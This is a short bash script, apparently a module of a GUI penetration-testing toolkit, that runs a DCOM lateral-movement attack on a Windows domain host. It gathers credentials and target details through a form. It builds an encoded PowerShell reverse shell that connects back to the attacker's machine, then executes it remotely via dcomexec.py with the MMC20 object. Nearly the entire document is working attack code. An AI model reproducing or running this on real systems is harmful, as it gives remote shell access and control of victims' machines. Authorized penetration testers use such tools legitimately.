#!/bin/bash

: '
perform executeDcom attack
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
LPORT_FIELD=$(form_item  "LPORT" "number" "lport" "1337")
DOMAIN_FIELD=$(form_item  "domain" "domain")
DC_FIELD=$(form_item  "dc" "dc")
IP_FIELD=$(form_item  "IP address" "ip")
USERNAME_FIELD=$(form_item  "username" "username")
PASSWORD_FIELD=$(form_item  "password" "password")

# Generate GUI form
generate_form "${LPORT_FIELD}" "${DOMAIN_FIELD}" "${DC_FIELD}" "${IP_FIELD}" "${USERNAME_FIELD}" "${PASSWORD_FIELD}"

LPORT=${form_data["lport"]}
DOMAIN=${form_data["domain"]}
DC=${form_data["dc"]}
IP=${form_data["ip"]}
USERNAME=${form_data["username"]}
PASSWORD=${form_data["password"]}

object="MMC20"
REV_SHELL=$(echo "\$client = New-Object System.Net.Sockets.TCPClient(\"${KALI_IP}\",${LPORT});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()" | iconv -t UTF-16LE | base64 -w 0)

execute_command "dcomexec.py ${DOMAIN}/${USERNAME}:'${PASSWORD}'@${DC} 'powershell -e ${REV_SHELL}' -nooutput -object ${object} -dc-ip ${IP}"
create_new_line
